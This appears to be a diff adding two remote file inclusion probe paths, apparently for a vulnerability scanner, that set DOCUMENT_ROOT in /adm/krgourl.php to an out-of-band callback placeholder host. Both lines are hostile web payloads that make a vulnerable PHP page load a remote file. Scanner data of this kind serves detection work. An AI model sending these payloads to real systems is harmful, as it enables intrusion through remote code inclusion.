@@ -1,0 +1,2 @@
+/adm/krgourl.php?DOCUMENT_ROOT=http://{{interactsh-url}}
+/adm/krgourl.php?DOCUMENT_ROOT=http://{{interactsh-url}}/file.txt
